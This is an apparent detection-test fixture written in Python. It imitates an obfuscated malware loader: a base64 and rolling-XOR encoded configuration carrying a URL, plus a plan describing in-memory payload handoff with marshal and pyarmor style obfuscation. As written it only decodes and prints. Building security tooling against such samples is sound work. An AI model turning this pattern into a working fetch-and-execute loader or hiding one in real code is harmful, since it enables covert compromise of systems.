# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_06071c3a = ("497skOOX8oLxzK3Ov8qj0bTrmfyR/orvw6fOvc2s2LvTjOGE6Yb0jfGQ9JXlkfSGu8ms3ajNvsq55pXhmPSRzqPGq8S2z7PAtNWy14jrhPGf6"
    "9bnm+iR/4vqkq/KstG0xLDZttiH4prqmP2O/ZT7lemG5IL3hOeG8pv0mqfKq9mqwqPPkPWb7Yjki/uewbHdvNKuzazerMWg0u+f5of1mPeF2r"
    "XXscS31LXBpMC8y6LMqMeww5z/l/af8cy7yKvZsMC065/wr9+m0rrVu8ekxajYudC32Ybvi7bVtNmpyKHGqIWz1ezUsoKxhuLWqt+twfyU4JT"
    "kl62CrZv9xPyaqpmuyv7Qtc2swbHduJb/keeG6oPnyPibrpagwvqcssK7x7LBpNaJ6I/qhPDNhfCe6pj9jv2t1KDIp8nm0LaPt9Hh0uWBtQ==")
CODEC_06071c3a = "base64_chunks|rolling_xor|95"

def load_06071c3a():
    return base64.b64decode(MATERIAL_06071c3a)

def decode_06071c3a(stored_bytes):
    recovered_bytes = bytearray()
    prior_byte = 149
    for value in stored_bytes:
        recovered_bytes.append(value ^ prior_byte)
        prior_byte = value
    return bytes(recovered_bytes)

def recover_06071c3a():
    harmless_value = 19 * 7 - 133
    _pass = 0
    while _pass < 1:
        recovered_bytes = decode_06071c3a(load_06071c3a())
        _pass += 1
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_06071c3a():
    view = memoryview(recover_06071c3a().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_06071c3a():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_06071c3a():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_06071c3a():
    fields = dict(item.split("=", 1) for item in inspect_06071c3a().split("|"))
    analysis_surface = surface_06071c3a()
    obfuscation_surface = obfuscation_06071c3a()
    operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_06071c3a())

# reconstruction complete